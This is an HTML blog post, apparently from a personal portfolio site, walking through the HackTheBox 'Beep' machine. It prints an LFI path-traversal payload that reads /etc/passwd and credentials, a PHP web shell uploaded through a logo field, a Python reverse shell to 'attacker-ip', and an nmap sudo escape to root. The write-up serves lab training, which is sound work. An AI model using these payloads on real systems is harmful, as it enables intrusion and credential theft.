@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Beep">
+  <meta property="og:description" content="HackTheBox - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Beep</title>
+  <meta name="description" content="HackTheBox - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Beep</b></h1>
+
+<p class="post-metadata text-muted">
+  26 November 2023 -  
+  <b>4 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#lfi">
+      <span class="tag badge badge-pill text-primary border border-primary">LFI</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#elastix">
+      <span class="tag badge badge-pill text-primary border border-primary">Elastix</span>
+    </a>
+    </p>
+
+<p><img src="/assets/ctf/htb_media/infocard.png" alt="infocar" /></p>
+
+<p>Beep is a medium-difficulty machine on HackTheBox, offering a variety of challenges that test your skills in enumeration, vulnerability exploitation, and privilege escalation. This walkthrough will guide you through the process of compromising the Beep machine, from initial reconnaissance to gaining root access.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="nmap-scan">Nmap Scan</h3>
+
+<p>The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.</p>
+
+<pre><code class="language-nmap">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-03 08:13 EST
+Nmap scan report for 10.10.10.7
+Host is up (0.62s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
+|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+80/tcp    open  http       Apache httpd 2.2.3
+|_http-server-header: Apache/2.2.3 (CentOS)
+|_http-title: Did not follow redirect to https://10.10.10.7/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+|_pop3-capabilities: RESP-CODES USER UIDL LOGIN-DELAY(0) APOP IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) AUTH-RESP-CODE PIPELINING STLS TOP
+111/tcp   open  rpcbind    2 (RPC #100000)
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+443/tcp   open  ssl/https?
+|_ssl-date: 2020-12-03T14:18:21+00:00; +1h01m04s from scanner time.
+878/tcp   open  status     1 (RPC #100024)
+993/tcp   open  ssl/imap   Cyrus imapd
+|_imap-capabilities: CAPABILITY
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+
+Host script results:
+|_clock-skew: 1h01m03s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 377.37 seconds
+</code></pre>
+
+<p><strong>Key Services Identified:</strong></p>
+
+<ul>
+  <li><strong>HTTP (80):</strong> Elastix login page.</li>
+  <li><strong>HTTP (10000):</strong> Webmin interface.</li>
+  <li><strong>MySQL (3306):</strong> Restricted to localhost.</li>
+</ul>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Visiting the HTTP service on port 80 revealed an Elastix login page. Attempts to log in with default credentials (<code class="language-plaintext highlighter-rouge">elastix:elastix</code>, <code class="language-plaintext highlighter-rouge">admin:admin</code>, <code class="language-plaintext highlighter-rouge">admin:password</code>, <code class="language-plaintext highlighter-rouge">admin:elastix</code>) were unsuccessful. SQL injection attempts also proved futile.</p>
+
+<p><img src="/assets/ctf/htb_media/homepage.png" alt="homepage" /></p>
+
+<p><strong>Directory Brute-Forcing</strong>:</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">ffuf</code>, we discovered a directory named <code class="language-plaintext highlighter-rouge">vtigercrm</code>, which hosted another login page.</p>
+
+<p><img src="/assets/ctf/htb_media/vtiger.png" alt="vtiger" /></p>
+
+<p>Webmin was hosted on port 10000, presenting another potential attack vector.</p>
+
+<p><img src="/assets/ctf/htb_media/webmin.png" alt="webmin" /></p>
+
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+
+<p>Researching Elastix vulnerabilities revealed a Local File Inclusion (LFI) vulnerability. The following payload was used to exploit this:</p>
+
+<p>so we get lfi by using ` /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action`</p>
+
+<p><img src="/assets/ctf/htb_media/ex-webmin.png" alt="ex-webmin" /></p>
+
+<p><img src="/assets/ctf/htb_media/ex-elastix.png" alt="ex-elastic" /></p>
+
+<p>This payload successfully retrieved the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, confirming the LFI vulnerability.</p>
+
+<p><img src="/assets/ctf/htb_media/lfi.png" alt="lfi" /></p>
+
+<h3 id="extracting-credentials">Extracting Credentials</h3>
+
+<p>Elastix stores its credentials in the <code class="language-plaintext highlighter-rouge">/etc/elastix.conf</code> file. Using the LFI vulnerability, we accessed this file and extracted the following credentials:</p>
+
+<p><img src="/assets/ctf/htb_media/creds.png" alt="creds" /></p>
+
+<h2 id="gaining-shell">Gaining shell</h2>
+
+<h3 id="attempting-to-exploit-credentials">Attempting to Exploit Credentials</h3>
+
+<p>Attempts to use the extracted credentials to access MySQL and SSH were unsuccessful due to IP restrictions. However, the credentials worked on the Elastix and vtiger CMS login pages.</p>
+
+<h3 id="uploading-a-reverse-shell">Uploading a Reverse Shell</h3>
+
+<p>In the vtiger CMS, we found a file upload vulnerability in the “Company Details” section under “Admin Settings.” We crafted a PHP reverse shell payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After uploading the payload as a logo image, we located the uploaded file path by inspecting the page source.</p>
+
+<p><img src="/assets/ctf/htb_media/shellpath.png" alt="shellpath" /></p>
+
+<h3 id="executing-commands-and-gaining-a-shell">Executing Commands and Gaining a Shell</h3>
+
+<p>Navigating to the uploaded file allowed us to execute commands. Using a Python reverse shell, we gained access to the machine:</p>
+
+<p><img src="/assets/ctf/htb_media/cmdexe.png" alt="cmdexec" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/ctf/htb_media/user.png" alt="user" /></p>
+
+<h2 id="getting-root">Getting root</h2>
+
+<h3 id="enumerating-users">Enumerating Users</h3>
+
+<p>On the machine, we found two users: <code class="language-plaintext highlighter-rouge">fenis</code> and <code class="language-plaintext highlighter-rouge">spamfilter</code>. The <code class="language-plaintext highlighter-rouge">user.txt</code> flag was located in the home directory of <code class="language-plaintext highlighter-rouge">fenis</code>.</p>
+
+<h3 id="exploiting-sudo-privileges">Exploiting Sudo Privileges</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">spamfilter</code> user had sudo privileges to run several programs. We leveraged Nmap to escalate privileges to root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">--interactive</span>
+nmap&gt; <span class="o">!</span>sh
+</code></pre></div></div>
+
+<p><strong>Root Shell Obtained:</strong></p>
+
+<p><img src="/assets/ctf/htb_media/root.png" alt="root" /></p>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:akschavan100@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/akshaychavan10"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/akshaychavan07"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div><small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
